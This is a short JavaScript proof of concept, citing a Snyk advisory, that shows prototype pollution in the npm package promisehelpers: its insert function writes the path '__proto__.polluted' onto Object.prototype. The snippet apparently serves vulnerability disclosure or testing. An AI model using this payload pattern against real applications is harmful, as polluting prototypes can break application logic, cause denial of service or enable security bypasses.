//https://snyk.io/vuln/SNYK-JS-PROMISEHELPERS-598686
    const promisehelpers = require('promisehelpers');
    obj = {}

    promisehelpers.insert(['__proto__', 'polluted'], "yes")(obj);
  